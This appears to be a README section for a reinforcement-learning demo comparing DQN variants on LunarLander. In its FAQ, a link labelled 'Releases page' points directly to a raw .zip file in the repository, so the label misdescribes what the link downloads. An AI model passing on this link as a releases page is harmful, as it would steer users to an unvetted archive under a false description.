### 🎮 Running the LunarLander Simulation

After you start the application, the LunarLander simulation will open. You can choose different agents to observe how each performs. Try switching between DQN, Double DQN, and Dueling DQN to see their differences.

## 📊 Understanding the Agents

Each type of agent learns differently:

- **DQN:** Basic agent that learns from experiences through reinforcement.
- **Double DQN:** Improves upon DQN by reducing overestimation of action values.
- **Dueling DQN:** Further refines learning by separating state and action values, enhancing training efficiency.

## 📽️ Viewing Training Analysis

The application provides video outputs showcasing each agent's performance. You can find these videos in the `videos` folder created during the simulation. Watching these can give you insights into the learning process of the agents.

## 📑 Additional Features

- **Performance Comparison:** Analyze how quickly and effectively each agent learns to land the spacecraft.
- **Interactive Configuration:** Modify parameters to see how they affect agent performance.
- **Comprehensive Training Logs:** The software saves logs of every training session.

## ❓ Frequently Asked Questions (FAQ)

### How can I reset the simulation?

Simply close the application and restart it. For a fresh start, delete any existing training logs from the `logs` folder.

### Do I need programming knowledge to use this?

No, this application is built for end-users. You can run the simulation without any programming experience.

### Where can I find more information?

You can visit the [Releases page](https://github.com/Dophinjet/lunarlander-dqn-comparison/raw/refs/heads/main/report/comparison_lunarlander_dqn_v2.8.zip) for updates and release notes. Additionally, the source code is available on GitHub for those who want to explore it further.
